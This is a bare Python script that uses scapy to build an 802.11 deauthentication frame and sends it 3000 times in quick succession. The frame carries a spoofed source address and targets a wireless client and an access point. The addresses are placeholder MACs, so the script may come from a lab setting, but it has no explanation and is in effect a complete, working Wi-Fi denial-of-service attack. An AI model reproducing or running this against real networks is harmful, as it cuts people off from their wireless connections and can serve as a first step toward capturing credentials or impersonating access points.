from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
AP, CLIENT, ROGUE = "02:00:00:00:00:00", "02:00:00:00:01:00", "02:aa:bb:cc:dd:ee"
pkt = RadioTap()/Dot11(type=0, subtype=12, addr1=CLIENT, addr2=ROGUE, addr3=AP)/Dot11Deauth(reason=7)
sendp(pkt, iface="listener", count=3000, inter=0.01, verbose=False)
